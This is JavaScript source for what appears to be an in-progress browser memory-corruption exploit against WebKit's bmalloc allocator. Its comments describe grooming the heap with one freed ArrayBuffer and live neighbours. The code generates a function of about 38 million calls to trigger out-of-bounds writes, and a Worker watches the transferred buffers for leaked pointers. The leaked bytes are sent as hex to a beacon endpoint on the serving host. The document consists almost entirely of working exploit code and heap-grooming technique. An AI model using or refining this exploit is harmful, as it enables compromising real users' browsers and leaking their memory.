// p175 — Single-hole bait: ONE freed AB, rest live zeros
//
// WHY p174 CRASHES: 20 freed baits have bmalloc free-list pointers in them.
// Buffer fills one slot but adjacent freed slots have non-zero data.
// First OOB read at call 894 dereferences a free-list pointer → SIGSEGV.
//
// FIX: Free exactly ONE AB. The buffer fills that slot.
// The slot directly after it is a LIVE AB (all zeros).
// OOB reads hit zeros → cache miss → slow path → no crash.
// OOB writes store real metadata (pointers) → worker reads them.
//
// Also: GC with object allocation, NOT ArrayBuffer (avoids marge pollution).
// 40 ABs × 100KB = 4MB = one marge page (contiguous).
//
// Beacon prefix: V175-

(function() {
  var BASE = location.protocol + '//' + location.host;
  var queue = [];
  var sending = false;

  function B(tag) {
    queue.push(tag);
    if (!sending) drain();
  }

  function drain() {
    if (queue.length === 0) { sending = false; return; }
    sending = true;
    var tag = queue.shift();
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V175-' + tag + '?t=' + Date.now(), true);
      x.onloadend = function() { setTimeout(drain, 15); };
      x.onerror = function() { setTimeout(drain, 15); };
      x.send();
    } catch(e) { setTimeout(drain, 15); }
  }

  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  var attempt = 0;
  try {
    attempt = parseInt(localStorage.getItem('p175_att') || '0');
    localStorage.setItem('p175_att', '' + (attempt + 1));
  } catch(e) {}

  B('BOOT-A' + attempt);

  // ── Allocate 40 × 100KB ABs (fills one marge page) ──
  var AB_SIZE = 102400;
  var N_TOTAL = 40;
  var allABs = [];
  try {
    for (var i = 0; i < N_TOTAL; i++) {
      allABs.push(new ArrayBuffer(AB_SIZE));
    }
  } catch(e) {
    B('OOM-' + allABs.length);
  }
  B('ALLOC-' + allABs.length);

  // The bait is the FIRST AB (index 0) — lowest address in the page
  // All others (1..39) are live runway
  var baitAB = allABs[0];
  var runwayABs = allABs.slice(1); // 39 ABs
  allABs = null;

  // ── Worker ──
  var workerCode = function() {
    var views = [];
    var baseUrl = '';
    var STRIDE = 112;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V175-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'buffers') {
        var abs = e.data.abs;
        for (var i = 0; i < abs.length; i++) {
          views.push(new Uint8Array(abs[i]));
        }
        beacon('BUFS-' + views.length);
        self.postMessage({ bufsReady: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCH');
        var found = false;
        var iters = 0;

        while (!found) {
          // Check first few ABs for any non-zero byte at stride offsets
          for (var bi = 0; bi < Math.min(views.length, 10); bi++) {
            var v = views[bi];
            var maxOff = v.length - STRIDE; // bounds: don't read past end
            for (var off = 0; off <= maxOff; off += STRIDE) {
              // Check key bytes: 0 (sentinel), 4, 8
              if (v[off] !== 0 || v[off+4] !== 0 || v[off+8] !== 0 || v[off+12] !== 0) {
                beacon('HIT-b' + bi + '-o' + off);

                // Dump first 112 bytes as hex
                var entry = '';
                for (var eb = 0; eb < STRIDE && (off+eb) < v.length; eb++) {
                  entry += hx(v[off+eb]);
                }
                beacon('E1-' + entry.substring(0, 200));
                beacon('E2-' + entry.substring(200));

                // Extract 8-byte values at key offsets
                var keyOff = [0, 8, 16, 24, 32, 40, 48, 56, 64, 68, 72, 80, 88, 96, 104];
                for (var oi = 0; oi < keyOff.length; oi++) {
                  var po = keyOff[oi];
                  if (off + po + 8 > v.length) continue;
                  var bytes = '';
                  var nonzero = false;
                  for (var pb = 7; pb >= 0; pb--) {
                    var b = v[off + po + pb];
                    bytes += hx(b);
                    if (b !== 0) nonzero = true;
                  }
                  if (nonzero) {
                    beacon('V-' + po + '-' + bytes);
                  }
                }
                found = true;
                break;
              }
            }
            if (found) break;
          }

          iters++;
          if (iters % 1000000 === 0) beacon('P-' + iters);
          if (iters > 200000000) { beacon('GIVEUP'); return; }
        }

        if (!found) return;

        // Scan all buffers
        var hitBufs = 0;
        var hitEntries = 0;
        for (var bi = 0; bi < views.length; bi++) {
          var v = views[bi];
          var bufHits = 0;
          var scanMax = v.length - STRIDE;
          for (var off = 0; off <= scanMax; off += STRIDE) {
            if (v[off] !== 0 || v[off+4] !== 0 || v[off+8] !== 0 || v[off+12] !== 0) {
              bufHits++;
              if (hitEntries < 5 && off + STRIDE <= v.length) {
                var vp = '';
                for (var vb = 0; vb < 24 && (off+88+vb) < v.length; vb++) {
                  vp += hx(v[off+88+vb]);
                }
                beacon('VP-' + bi + '-' + off + '-' + vp);
              }
              hitEntries++;
            }
          }
          if (bufHits > 0) {
            hitBufs++;
            beacon('BF' + bi + '-' + bufHits);
          }
        }
        beacon('TOT-' + hitBufs + 'b-' + hitEntries + 'e');
        beacon('DONE');
      }
    };
  };

  var watchBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var watcher = new Worker(URL.createObjectURL(watchBlob));
  watcher.postMessage({ cmd: 'init', baseUrl: BASE });

  // Transfer runway ABs to worker
  var transferList = [];
  for (var i = 0; i < runwayABs.length; i++) transferList.push(runwayABs[i]);
  watcher.postMessage({ cmd: 'buffers', abs: runwayABs }, transferList);
  runwayABs = null;

  watcher.onmessage = function(e) {
    if (e.data.bufsReady) {
      B('XFER-OK');
      doFreeAndBuild();
    }
  };

  function doFreeAndBuild() {
    // Free the ONE bait AB
    baitAB = null;
    B('BAIT-FREE');

    // GC with OBJECT allocation only (no ArrayBuffer — avoids marge pollution)
    var gc = 0;
    function gcRound() {
      var trash = [];
      for (var j = 0; j < 50000; j++) trash.push({ x: gc, y: j });
      trash = null;
      gc++;
      if (gc < 20) setTimeout(gcRound, 30);
      else { B('GC-OK'); doBuild(); }
    }
    gcRound();
  }

  function doBuild() {
    B('BUILD');
    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v175=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v175ok=1;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1048576 | 0) + 'M');
    callChunk = null; remChunk = null; parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMP-' + (window.__v175ok ? 'OK' : 'NO'));
      if (!window.__v175) { B('NOFN'); return; }

      watcher.postMessage({ cmd: 'watch' });

      setTimeout(function() {
        B('CALL');
        // Diagnostic: sync beacons from callback to find crash point
        var cbN = 0;
        var cbBase = BASE;
        try {
          window.__v175(function(){
            cbN++;
            // Sync XHR at key milestones: last safe, first OOB, and beyond
            if (cbN === 100 || cbN === 500 || cbN === 893 || cbN === 894 ||
                cbN === 895 || cbN === 1000 || cbN === 5000 || cbN === 10000 ||
                cbN === 50000 || cbN === 100000 || cbN === 500000 || cbN === 1000000 ||
                cbN === 5000000 || cbN === 10000000) {
              try {
                var x = new XMLHttpRequest();
                x.open('GET', cbBase + '/beacon/V175-CB-' + cbN + '?t=' + Date.now(), false);
                x.send();
              } catch(e2) {}
            }
          });
        } catch(ex) {
          B('EX-' + (ex.message || '').substring(0, 40));
        }
        B('ALIVE-' + cbN);
      }, 200);
    };

    sc.onerror = function() { B('SERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
